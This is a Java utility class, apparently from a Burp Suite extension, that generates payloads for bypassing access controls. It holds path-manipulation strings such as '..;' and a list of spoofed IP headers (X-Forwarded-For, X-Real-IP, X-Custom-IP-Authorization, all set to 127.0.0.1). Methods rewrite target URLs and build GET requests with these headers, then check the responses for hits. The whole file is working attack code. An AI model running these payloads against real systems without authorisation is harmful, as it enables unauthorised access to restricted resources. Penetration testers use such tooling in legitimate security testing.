package burp.utils;

import burp.IResponseKeywords;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class BypassPayloadUtils {
    public static final String[] URL_BYPASS = new String[]{
            ".",
            ";",
            "..;",
/*            ";%09..;",
            ";%09..",
            ";%2f..",
            "*",
            "%09",
            "%20",
            "%23",
            "%2e",
            "%2f"*/
    };
    public static final String[] HEADER_BYPASS = new String[]{
            "Client-IP: 127.0.0.1",
            "X-Real-IP: 127.0.0.1",
            "Redirect: 127.0.0.1",
            "Referer: 127.0.0.1",
            "-Client-IP: 127.0.0.1",
            "X-Custom-IP-Authorization: 127.0.0.1",
            "X-Forwarded-By: 127.0.0.1",
            "X-Forwarded-For: 127.0.0.1",
            "X-Forwarded-Host: 127.0.0.1",
            "X-Forwarded-Port: 80",
            "X-True-IP: 127.0.0.1"
    };
    public static final String[] GET_SKIPED_HEADERS = new String[]{"content-type", "content-length"};

    public static URL[] getBypassPayloads(URL baseUrl, String[] resParts) {
        List<URL> result = new ArrayList<>();
        String originUrl = baseUrl.toString();
        originUrl = originUrl.endsWith("/") ? originUrl : originUrl + "/";
        try {
            result.add(new URL(originUrl + String.join("/", resParts)));
            for (String bypassPayload : URL_BYPASS) {
                result.add(new URL(originUrl + bypassPayload + "/" + String.join("/" + bypassPayload + "/", resParts)));
            }
        } catch (Exception ex) {
            System.out.println(ex);
        }
        return result.toArray(new URL[0]);
    }

    public static byte[] makeNewGETRequest(List<String> originHeaders, URL url) {
        List<String> headers = new ArrayList<String>() {{
            add(
                    "GET " + url.getPath() + " HTTP/1.1"
            );
        }};
        for (int i = 1; i < originHeaders.size(); i++) { //skip url line.
            HttpHeader header = new HttpHeader(originHeaders.get(i));
            if (Arrays.stream(GET_SKIPED_HEADERS).anyMatch(e -> e.equalsIgnoreCase(header.Name))) {
                continue;
            } else {
                if (header.Name.equalsIgnoreCase("accept")) {
                    headers.add("Accept: */*");
                } else {
                    headers.add(header.toString());
                }
            }
        }
        headers.addAll(Arrays.asList(HEADER_BYPASS));
        return Utils.Helpers.buildHttpMessage(headers, null);
    }

    public static boolean hasFound(IResponseKeywords keywords, int responseIndex) {
        for (String keyword : keywords.getInvariantKeywords()) {
            if (keywords.getKeywordCount(keyword, responseIndex) > 0) {
                return true;
            }
        }
        return false;
    }
}
